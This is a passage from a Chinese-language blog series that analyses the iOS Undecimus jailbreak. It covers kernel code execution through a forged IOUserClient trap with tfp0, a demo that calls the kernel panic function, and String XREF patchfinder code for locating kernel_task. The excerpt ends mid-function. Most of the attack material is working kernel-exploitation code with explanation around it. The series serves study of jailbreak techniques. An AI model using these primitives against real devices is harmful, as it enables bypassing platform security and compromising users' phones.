<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kptr_t</span> <span class="title">kexec</span><span class="params">(<span class="keyword">kptr_t</span> ptr, <span class="keyword">kptr_t</span> x0, <span class="keyword">kptr_t</span> x1, <span class="keyword">kptr_t</span> x2, <span class="keyword">kptr_t</span> x3, <span class="keyword">kptr_t</span> x4, <span class="keyword">kptr_t</span> x5, <span class="keyword">kptr_t</span> x6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">kptr_t</span> returnval = <span class="number">0</span>;</span><br><span class="line">    pthread_mutex_lock(&amp;kexec_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __arm64e__</span></span><br><span class="line">    returnval = kernel_call_7(ptr, <span class="number">7</span>, x0, x1, x2, x3, x4, x5, x6);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">// When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user-&gt;kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex</span></span><br><span class="line">    <span class="comment">// to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.</span></span><br><span class="line">    <span class="comment">// This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the</span></span><br><span class="line">    <span class="comment">// function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed</span></span><br><span class="line">    <span class="comment">// through like normal.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it</span></span><br><span class="line">    <span class="comment">// We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents</span></span><br><span class="line">    <span class="comment">// (i'm not actually sure if the switch back is necessary but meh)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// IOTrap starts at +0x40</span></span><br><span class="line">    <span class="comment">// fake_client 即我们构造的 userClient</span></span><br><span class="line">    <span class="comment">// 0ffx20 为 IOTrap-&gt;object，offx28 为 IOTrap-&gt;func，这里是对原始值进行备份</span></span><br><span class="line">    <span class="keyword">kptr_t</span> offx20 = ReadKernel64(fake_client + <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">kptr_t</span> offx28 = ReadKernel64(fake_client + <span class="number">0x48</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// IOTrap-&gt;object = arg0</span></span><br><span class="line">    WriteKernel64(fake_client + <span class="number">0x40</span>, x0);</span><br><span class="line">    <span class="comment">// IOTrap-&gt;func = func_ptr</span></span><br><span class="line">    WriteKernel64(fake_client + <span class="number">0x48</span>, ptr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// x1~x6 为函数的第 1 ~ 6 个参数，第 0 个参数通过 trap-&gt;object 传入</span></span><br><span class="line">    returnval = IOConnectTrap6(user_client, <span class="number">0</span>, x1, x2, x3, x4, x5, x6);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里对原始值进行恢复</span></span><br><span class="line">    WriteKernel64(fake_client + <span class="number">0x40</span>, offx20);</span><br><span class="line">    WriteKernel64(fake_client + <span class="number">0x48</span>, offx28);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    pthread_mutex_unlock(&amp;kexec_lock);</span><br><span class="line">    <span class="keyword">return</span> returnval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基于上述讨论这段代码还是很好理解的，到这里非 arm64e 架构下的内核任意代码执行原理就讲解完了，有关 arm64e 的讨论将在下一篇文章中继续，下面我们用 kexec 做一个实验来验证 Primitive 的达成。</p>
<h1 id="kexec-实验"><a href="#kexec-实验" class="headerlink" title="kexec 实验"></a>kexec 实验</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>请读者打开 Undecimus 源码的 <code>jailbreak.m</code>，搜索 <code>_assert(init_kexec()</code> 定位到初始化 kexec 的代码，向上翻可以发现 kexec 的初始化被放到了 ShenanigansPatch 和 setuid(0) 之后。ShenanigansPatch 是用来解决内核对 sandbox 化进程的 ucred 检查而采取的绕过措施[3]，它是通过 String XREF 定位和修改内核全局变量实现的，有兴趣的读者可以自行阅读 <a href="https://stek29.rocks/2018/12/11/shenanigans.html" target="_blank" rel="noopener">Shenanigans, Shenanigans!</a> 来了解。</p>
<p>对于非 arm64e 设备，似乎仅通过 tfp0 即可实现 kexec，这段处理应该是针对 arm64e 设备绕过 PAC 所做的必要提权处理。</p>
<p><strong>我们的实验代码一定要放到 <code>init_kexec</code> 执行成功之后才行</strong>。</p>
<h2 id="获取一个内核函数的地址"><a href="#获取一个内核函数的地址" class="headerlink" title="获取一个内核函数的地址"></a>获取一个内核函数的地址</h2><p>在 Undecimus 中获得了许多关键函数的地址，它们通过声明一个名为 find_xxx 的导出符号实现动态查找和缓存，需要注意的是，在 kexec 初始化后 kerneldump 已经被释放，因此必须在初始化 kerneldump 时就计算好函数的地址。</p>
<p>我们先参考 Undecimus 是如何查找和缓存一个内核数据的，以 vnode_lookup 函数为例：<br>首先我们需要在 <code>patchfinder64.h</code> 中声明一个名为 <code>find_&lt;symbol_name&gt;</code> 的函数，它返回被查找符号的地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">find_vnode_lookup</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>随后基于 String XREF 完成查找的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">addr_t</span> <span class="title">find_vnode_lookup</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">addr_t</span> hfs_str = find_strref(<span class="string">"hfs: journal open cb: error %d looking up device %s (dev uuid %s)\n"</span>, <span class="number">1</span>, string_base_pstring, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hfs_str) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    hfs_str -= kerndumpbase;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">addr_t</span> call_to_stub = step64_back(kernel, hfs_str, <span class="number">10</span>*<span class="number">4</span>, INSN_CALL);</span><br><span class="line">    <span class="keyword">if</span> (!call_to_stub) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> follow_stub(kernel, call_to_stub);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>随后在 kerneldump 阶段通过宏函数 find_offset 完成查找：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find_offset(vnode_lookup, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>上述宏函数会动态调用 <code>find_&lt;symbol_name&gt;</code> 函数并将结果缓存起来，随后可通过 <code>getoffset</code> 宏函数来获取相应的偏移：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kptr_t</span> <span class="keyword">const</span> function = getoffset(vnode_lookup);</span><br></pre></td></tr></table></figure>

<p>这里我们照猫画虎的创建一个 panic 函数偏移：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">find_panic</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">addr_t</span> ref = find_strref(<span class="string">"\"shenanigans!"</span>, <span class="number">1</span>, string_base_pstring, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!ref) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ref + <span class="number">0x4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里查找的代码是位于 sandbox.kext 中的 panic 语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">panic(<span class="string">"\"shenanigans!\""</span>);</span><br></pre></td></tr></table></figure>

<p>通过 String XREF 我们能定位到 panic 调用前的 add 指令，下一条指令一定是 <code>bl _panic</code>，因此将查找结果 + 4 即可得到内核中 panic 函数的地址。</p>
<h2 id="调用内核函数"><a href="#调用内核函数" class="headerlink" title="调用内核函数"></a>调用内核函数</h2><p>在上文中我们找到了 panic 函数的地址，这里尝试用一个自定义字符串触发一个 kernel panic，注意由于 SMAP 的存在，panic string 要从 userland 拷贝到 kernel：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// play with kexec</span></span><br><span class="line"><span class="keyword">uint64_t</span> function = getoffset(panic);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *testStr = <span class="string">"this panic is caused by userland!!!!!!!!!!!!!!!"</span>;</span><br><span class="line"><span class="keyword">kptr_t</span> kstr = kmem_alloc(<span class="built_in">strlen</span>(testStr));</span><br><span class="line">kwrite(kstr, testStr, <span class="built_in">strlen</span>(testStr));</span><br><span class="line"><span class="keyword">kptr_t</span> ret = kexec(function, (<span class="keyword">kptr_t</span>)kstr, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL);</span><br><span class="line">NSLog(@<span class="string">"result is %@"</span>, @(ret));</span><br><span class="line">kmem_free(kstr, <span class="keyword">sizeof</span>(testStr));</span><br></pre></td></tr></table></figure>

<p>随后运行 Undecimus，会发生 kernel panic，为了验证我们成功调用了内核的 panic 函数，在 iPhone 上打开设置页，打开 <code>Privacy-&gt;Analytics-&gt;Analytics Data</code>，找到其中以 <code>panic-full</code> 开头的最新日志，如果试验成功可以看到如下内容：<br><img src="https://user-gold-cdn.xitu.io/2020/1/12/16f991d81a07fa8b?w=592&h=1280&f=png&s=673260" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文详细介绍了非 arm64e 架构下通过 tfp0 实现 kexec 的过程和原理，由此可以给读者构造 ROP Gadget 带来启发。从下一篇文章开始，我们将分析 PAC 缓解措施及其绕过技巧。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html#" target="_blank" rel="noopener">Brandon Azad, Project Zero. Examining Pointer Authentication on the iPhone XS</a></li>
<li><a href="https://www.cnblogs.com/malecrab/p/5572730.html" target="_blank" rel="noopener">Malecrab. C/C++杂记：虚函数的实现的基本原理</a></li>
<li><a href="https://stek29.rocks/2018/12/11/shenanigans.html" target="_blank" rel="noopener">stek29.rocks. Shenanigans, Shenanigans!</a></li>
<li><a href="https://github.com/pwn20wndstuff/Undecimus/blob/9d7a1076a2b088b25677f4a53822a3c396b1b837/Undecimus/source/jailbreak.m" target="_blank" rel="noopener">pwn20wndstuff. Undecimus</a></li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/12/29/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89%E9%80%9A%E8%BF%87-String-XREF-%E5%AE%9A%E4%BD%8D%E5%86%85%E6%A0%B8%E6%95%B0%E6%8D%AE/">Undecimus 分析（二）通过 String XREF 定位内核数据</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-12-29</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/JailBreak/">JailBreak</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Undecimus/">Undecimus</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/XREF/">XREF</a></span><div class="content"><h1 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h1><ol>
<li><a href="https://juejin.im/post/5dd10660e51d453fac0a598d" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying</a></li>
<li><a href="https://juejin.im/post/5dd918d051882573180a2ba7" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address</a></li>
<li><a href="https://juejin.im/post/5de37a236fb9a071b5615dea" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（三）IOSurface Heap Spraying</a></li>
<li><a href="https://juejin.im/post/5dec7f2f6fb9a0160c411516" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（四）The tfp0 !</a></li>
<li><a href="https://juejin.im/post/5df5f6416fb9a016402d1cc0" target="_blank" rel="noopener">iOS Jailbreak Principles - Undecimus 分析（一）Escape from Sandbox</a></li>
</ol>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在内核中有许多关键变量和校验，为获得这些变量和绕过校验就要求我们在内存中定位这些地址。本文将介绍 Undecimus 中基于 String XREF 定位关键内存地址的方法，通过该方法不仅可以准确定位内核中的特定元素，也能为自行设计二进制分析工具带来很好的启发。</p>
<h1 id="定位-Kernel-Task"><a href="#定位-Kernel-Task" class="headerlink" title="定位 Kernel Task"></a>定位 Kernel Task</h1><p>为了获取内核信息，我们需要定位到 Kernel Task 的地址，再通过 tfp0 的 kread 读取内容。要定位 Kernel Task，关键是找到获取 Kernel Task 的代码，然后尝试从内存中定位这段代码，再分析指令解出变量的文件偏移即可。</p>
<h2 id="查找使用-Kernel-Task-的函数"><a href="#查找使用-Kernel-Task-的函数" class="headerlink" title="查找使用 Kernel Task 的函数"></a>查找使用 Kernel Task 的函数</h2><p>在 <a href="https://github.com/apple/darwin-xnu/tree/xnu-4903.221.2" target="_blank" rel="noopener">xnu-4903.221.2</a> 中可以找到访问 Kernel Task 的如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">proc_apply_resource_actions(<span class="keyword">void</span> * bsdinfo, __unused <span class="keyword">int</span> type, <span class="keyword">int</span> action)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">proc_t</span> p = (<span class="keyword">proc_t</span>)bsdinfo;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(action) &#123;</span><br><span class="line">        <span class="keyword">case</span> PROC_POLICY_RSRCACT_THROTTLE:</span><br><span class="line">        	<span class="comment">/* no need to do anything */</span></span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> PROC_POLICY_RSRCACT_SUSPEND:</span><br><span class="line">        	task_suspend(p-&gt;task);</span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> PROC_POLICY_RSRCACT_TERMINATE:</span><br><span class="line">        	psignal(p, SIGKILL);</span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> PROC_POLICY_RSRCACT_NOTIFY_KQ:</span><br><span class="line">        	<span class="comment">/* not implemented */</span></span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> PROC_POLICY_RSRCACT_NOTIFY_EXC:</span><br><span class="line">        	panic(<span class="string">"shouldn't be applying exception notification to process!"</span>);</span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一段字符串 “shouldn’t be applying exception notification to process!” 可用于辅助定位，它在编译后会被存储在 <code>__TEXT,__cstring</code> 段，通过在内存中搜索 <code>__TEXT,__cstring</code> 段即可找到字符串地址，我们称之为 <code>location_str</code>。</p>
<h2 id="定位到函数中的-String-XREF"><a href="#定位到函数中的-String-XREF" class="headerlink" title="定位到函数中的 String XREF"></a>定位到函数中的 String XREF</h2><p>由于 ARM 的取址常常需要 2 条指令完成，为了定位使用 <code>location_str</code> 的代码，我们需要对代码段进行静态分析。当发现寄存器中的值等于 <code>location_str</code> 时即发现了一个交叉引用(XREF)，通过这种手段我们便能在内存中定位到语句 <code>panic(&quot;shouldn&#39;t be applying exception notification to process!&quot;)</code> 对应的指令地址。</p>
<h2 id="回溯找到-Kernel-Task-XREF"><a href="#回溯找到-Kernel-Task-XREF" class="headerlink" title="回溯找到 Kernel Task XREF"></a>回溯找到 Kernel Task XREF</h2><p>最快定位到 Kernel Task 的方法是回溯到 <code>task_suspend(p-&gt;task)</code>，在 <code>task_suspend</code> 第一次访问 <code>p-&gt;task</code> 时一定会对 task 寻址，我们可以从寻址指令中解出 task 的文件偏移，再加上内核在内存中的基地址即可得到 Kernel Task 的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">task_suspend(<span class="keyword">task_t</span> task)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr;</span><br><span class="line">    <span class="keyword">mach_port_t</span> port, send, old_notify;</span><br><span class="line">    <span class="keyword">mach_port_name_t</span> name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (task == TASK_NULL || task == kernel_task)</span><br><span class="line">    	<span class="keyword">return</span> (KERN_INVALID_ARGUMENT);</span><br><span class="line">    </span><br><span class="line">    task_lock(task);</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>从上面的分析可以看出问题的关键在于 XREF 的定位，下面我们将分析一种 String Based XREF 定位算法来解决上述问题。</p>
<h1 id="在内存中加载-Kernelcache"><a href="#在内存中加载-Kernelcache" class="headerlink" title="在内存中加载 Kernelcache"></a>在内存中加载 Kernelcache</h1><p>根据 iPhone Wiki 给出的 Kernelcache 定义[1]：</p>
<blockquote>
<p>The kernelcache is basically the kernel itself as well as all of its extensions (AppleImage3NORAccess, IOAESAccelerator, IOPKEAccelerator, etc.) into one file, then packed/encrypted in an IMG3 (iPhone OS 2.0 and above) or 8900 (iPhone OS 1.0 through 1.1.4) container.</p>
</blockquote>
<p>即 kernelcache 就是将 kernel 和它的扩展打包在一个文件中并以 IMG3 格式存储(iOS 2 以上)。</p>
<p>在 <a href="https://juejin.im/post/5df5f6416fb9a016402d1cc0" target="_blank" rel="noopener">上一篇文章</a> 中我们介绍了基于 tfp0 的沙盒逃逸方法，通过沙盒逃逸我们可以从 <code>/System/Library/Caches/com.apple.kernelcaches/kernelcache</code> 读取 kernelcache，它既是当前系统加载的镜像。</p>
<p>读者可打开 Undecimus 的 <code>jailbreak.m</code> 文件，搜索 “Initializing patchfinder” 定位到 kernelcache 的加载代码，加载方法和普通的 <code>Mach-O</code> 文件类似，也是先读取 <code>Mach Header</code> 和 <code>Load Commands</code>，然后逐段记录偏移量，具体代码在 <code>init_kernel</code> 函数中。</p>
<p>这里不再赘述加载过程，只指出几个关键的全局变量：</p>
<ol>
<li><code>cstring_base</code> 和 <code>cstring_size</code> 是 <code>__TEXT,__cstring</code> 段的虚拟地址和长度；</li>
<li><code>xnucore_base</code> 和 <code>xnucore_size</code> 是 <code>__TEXT,__TEXT_EXEC</code> 段，即代码段的虚拟地址和长度；</li>
<li><code>kerndumpbase</code> 是所有段中最小的虚拟地址，即 kernelcache 加载的虚拟基地址，在普通的 <code>Mach-O</code> 文件中这个值一般是 <code>__PAGEZERO</code> 段的虚拟地址 0x100000000，在内核中似乎是 <code>__TEXT</code> 段的虚拟地址 0xFFFFFFF007004000；</li>
<li><code>kernel</code> 是 kernelcache 在用户空间的完整映射，即一份完整加载的内核镜像。</li>
</ol>
<h1 id="Find-String-Based-XREF"><a href="#Find-String-Based-XREF" class="headerlink" title="Find String Based XREF"></a>Find String Based XREF</h1><p>在 Undecimus 中包含一个 <code>find_strref</code> 函数用于定位字符串的 XREF：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">addr_t</span></span><br><span class="line">find_strref(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">string</span>, <span class="keyword">int</span> n, <span class="keyword">enum</span> string_bases string_base, <span class="keyword">bool</span> full_match, <span class="keyword">bool</span> ppl_base)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *str;</span><br><span class="line">    <span class="keyword">addr_t</span> base;</span><br><span class="line">    <span class="keyword">addr_t</span> <span class="built_in">size</span>;</span><br><span class="line">    <span class="keyword">enum</span> text_bases text_base = ppl_base?text_ppl_base:text_xnucore_base;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (string_base) &#123;</span><br><span class="line">        <span class="keyword">case</span> string_base_const:</span><br><span class="line">            base = const_base;</span><br><span class="line">            <span class="built_in">size</span> = const_size;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> string_base_data:</span><br><span class="line">            base = data_base;</span><br><span class="line">            <span class="built_in">size</span> = data_size;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> string_base_oslstring:</span><br><span class="line">            base = oslstring_base;</span><br><span class="line">            <span class="built_in">size</span> = oslstring_size;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> string_base_pstring:</span><br><span class="line">            base = pstring_base;</span><br><span class="line">            <span class="built_in">size</span> = pstring_size;</span><br><span class="line">            text_base = text_prelink_base;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> string_base_cstring:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            base = cstring_base;</span><br><span class="line">            <span class="built_in">size</span> = cstring_size;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">addr_t</span> off = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((str = boyermoore_horspool_memmem(kernel + base + off, <span class="built_in">size</span> - off, (<span class="keyword">uint8_t</span> *)<span class="built_in">string</span>, <span class="built_in">strlen</span>(<span class="built_in">string</span>)))) &#123;</span><br><span class="line">        <span class="comment">// Only match the beginning of strings</span></span><br><span class="line">        <span class="comment">// first_string || \0this_string</span></span><br><span class="line">        <span class="keyword">if</span> ((str == kernel + base || *(str<span class="number">-1</span>) == <span class="string">'\0'</span>) &amp;&amp; (!full_match || <span class="built_in">strcmp</span>((<span class="keyword">char</span> *)str, <span class="built_in">string</span>) == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// find after str</span></span><br><span class="line">        off = str - (kernel + base) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!str) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// find xref</span></span><br><span class="line">    <span class="keyword">return</span> find_reference(str - kernel + kerndumpbase, n, text_base);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它要求传入字符串 string，引用的序号 n，基准段 string_base，是否完全匹配 <code>full_match</code>，以及是否位于 <code>__PPLTEXT</code> 段，对于寻找 Kernel Task 的场景，我们的入参如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">addr_t</span> str = find_strref(<span class="string">"\"shouldn't be applying exception notification"</span>, <span class="number">2</span>, string_base_cstring, <span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>即以 <code>__TEXT,__cstring</code> 为基准，不要求完全匹配，找到第 2 个交叉引用所在的地址。</p>
<h2 id="定位字符串地址"><a href="#定位字符串地址" class="headerlink" title="定位字符串地址"></a>定位字符串地址</h2><p>字符串地址的定位逻辑在 <code>boyermoore_horspool_memmem</code> 函数中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *</span><br><span class="line">boyermoore_horspool_memmem(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>* haystack, <span class="keyword">size_t</span> hlen,</span><br><span class="line">                           <span class="keyword">const</span> 